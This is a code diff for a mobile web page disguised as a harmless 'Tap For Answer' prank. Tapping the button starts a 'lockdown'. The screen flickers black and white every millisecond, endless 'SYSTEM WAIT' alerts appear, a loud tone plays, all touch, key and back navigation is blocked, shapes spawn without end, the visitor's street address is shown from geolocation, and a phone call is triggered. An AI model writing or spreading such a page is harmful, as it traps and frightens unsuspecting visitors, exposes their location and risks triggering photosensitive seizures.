@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>The Answer Is....</title>
+  <title>Answer</title>
   <style>
     html, body {
       margin:0; padding:0;
@@ -14,6 +14,9 @@
       touch-action:none;
       -webkit-touch-callout:none;
       background:black;
+      position: relative;
+      font-family: monospace, monospace;
+      color: white;
     }
     #start-btn {
       position: absolute;
@@ -29,72 +32,193 @@
       -webkit-user-select:none;
       z-index: 999999;
     }
+    #location {
+      position: fixed;
+      bottom: 5px;
+      left: 5px;
+      font-size: 24px;
+      font-weight: bold;
+      color: red;
+      z-index: 1000000;
+      user-select:none;
+      pointer-events:none;
+      white-space: pre-wrap;
+      max-width: 90vw;
+      background: rgba(0,0,0,0.8);
+      padding: 10px 15px;
+      border-radius: 6px;
+      font-family: monospace, monospace;
+    }
   </style>
 </head>
 <body>
-  <button id="start-btn">Answer :D</button>
+  <button id="start-btn">Tap For Answer</button>
+  <div id="location"></div>
 <script>
-  const BEEP_VOLUME = 10000000000000000000; // Change this to adjust beep volume (0 to 1)
+  // === CONFIG ===
+  const BEEP_VOLUME = 0.3;  // 0 to 1
+  const BEEP_FREQ = 1200;   // Hz
+  const ALERT_INTERVAL_MS = 100; // Alerts frequency
+  const SHAPE_INTERVAL_MS = 50;  // Shapes spawn frequency
+  const PHONE_NUMBER_TO_CALL = '+1234567890'; // CHANGE THIS to desired phone number (include country code)
+
   const startBtn = document.getElementById('start-btn');
+  const locationDiv = document.getElementById('location');
 
   let audioCtx, oscillator, gainNode;
   let flickerRunning = false;
 
-  // Flicker function - toggles black/white as fast as possible
+  // Flicker background black/white super fast
   function flicker() {
     if (!flickerRunning) return;
-    document.body.style.background = (document.body.style.background === 'black') ? 'white' : 'black';
+    document.body.style.background = document.body.style.background === 'black' ? 'white' : 'black';
     setTimeout(flicker, 1);
   }
 
-  // Chain alert spam on a 100ms loop
+  // Flood infinite alerts chained
   function alertSpam() {
     alert("SYSTEM WAIT");
-    setTimeout(alertSpam, 100);
+    setTimeout(alertSpam, ALERT_INTERVAL_MS);
   }
 
-  // Block all touch & clicks (except the start button)
+  // Block all user input except first tap
   function blockAll(e) {
     e.preventDefault();
     e.stopPropagation();
     return false;
   }
 
+  // Start beep sound with chosen frequency and volume
   function startAudio() {
     audioCtx = new (window.AudioContext || window.webkitAudioContext)();
     oscillator = audioCtx.createOscillator();
     gainNode = audioCtx.createGain();
 
     oscillator.type = 'square';
-    oscillator.frequency.setValueAtTime(1200, audioCtx.currentTime);
+    oscillator.frequency.setValueAtTime(BEEP_FREQ, audioCtx.currentTime);
     gainNode.gain.setValueAtTime(BEEP_VOLUME, audioCtx.currentTime);
 
     oscillator.connect(gainNode).connect(audioCtx.destination);
     oscillator.start();
   }
 
+  // Random shape generator
+  function randomShape() {
+    const shapeTypes = ['circle', 'square', 'triangle'];
+    const type = shapeTypes[Math.floor(Math.random() * shapeTypes.length)];
+
+    const shape = document.createElement('div');
+    const size = Math.random() * 60 + 20; // 20px to 80px size
+    const x = Math.random() * window.innerWidth;
+    const y = Math.random() * window.innerHeight;
+    const color = `hsl(${Math.floor(Math.random() * 360)}, 80%, 60%)`;
+
+    shape.style.position = 'fixed';
+    shape.style.left = `${x}px`;
+    shape.style.top = `${y}px`;
+    shape.style.width = `${size}px`;
+    shape.style.height = `${size}px`;
+    shape.style.backgroundColor = color;
+    shape.style.zIndex = 9999999;
+    shape.style.pointerEvents = 'none';
+
+    switch(type) {
+      case 'circle':
+        shape.style.borderRadius = '50%';
+        break;
+      case 'square':
+        break;
+      case 'triangle':
+        shape.style.width = '0';
+        shape.style.height = '0';
+        shape.style.borderLeft = `${size/2}px solid transparent`;
+        shape.style.borderRight = `${size/2}px solid transparent`;
+        shape.style.borderBottom = `${size}px solid ${color}`;
+        shape.style.backgroundColor = 'transparent';
+        break;
+    }
+
+    document.body.appendChild(shape);
+
+    setTimeout(() => {
+      shape.remove();
+    }, 5000);
+  }
+
+  // Show user detailed location info using reverse geocode
+  async function showLocation() {
+    if (!navigator.geolocation) {
+      locationDiv.textContent = "Geolocation not supported.";
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(async pos => {
+      const {latitude, longitude} = pos.coords;
+      try {
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`, {
+          headers: {
+            'Accept-Language': 'en',
+            'User-Agent': 'Mozilla/5.0 (compatible)'
+          }
+        });
+        if (!res.ok) throw new Error("Reverse geocode failed");
+        const data = await res.json();
+        const addr = data.address || {};
+
+        let lines = [];
+        for (const [key, value] of Object.entries(addr)) {
+          const niceKey = key.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
+          lines.push(`${niceKey}: ${value}`);
+        }
+        locationDiv.textContent = lines.join('\n');
+      } catch {
+        locationDiv.textContent = `Lat: ${latitude.toFixed(6)}\nLon: ${longitude.toFixed(6)}`;
+      }
+    }, err => {
+      locationDiv.textContent = "Location access denied.";
+    });
+  }
+
+  // Trigger phone call via tel: link
+  function triggerCall() {
+    const a = document.createElement('a');
+    a.href = `tel:${PHONE_NUMBER_TO_CALL}`;
+    a.style.display = 'none';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }
+
+  // Main lockdown start function
   function lockdown() {
     flickerRunning = true;
     flicker();
     alertSpam();
-
     startAudio();
 
     startBtn.style.display = 'none';
 
+    // Block all user inputs on page
     document.addEventListener('touchstart', blockAll, {passive:false, capture:true});
     document.addEventListener('touchmove', blockAll, {passive:false, capture:true});
     document.addEventListener('touchend', blockAll, {passive:false, capture:true});
     document.addEventListener('click', blockAll, {passive:false, capture:true});
-
     window.addEventListener('keydown', e => e.preventDefault(), {passive:false, capture:true});
     window.addEventListener('contextmenu', e => e.preventDefault(), {passive:false});
 
     document.documentElement.style.touchAction = 'none';
 
-    // Prevent back navigation on iOS
+    // Prevent back navigation on iOS Safari
     history.pushState(null, null, location.href);
     window.onpopstate = () => history.go(1);
+
+    // Spawn shapes endlessly
+    setInterval(randomShape, SHAPE_INTERVAL_MS);
+
+    // Show location
+    showLocation();
+
+    // Trigger phone call (note: user confirmation required by iOS)
+    triggerCall();
   }
 
   startBtn.addEventListener('click', lockdown);
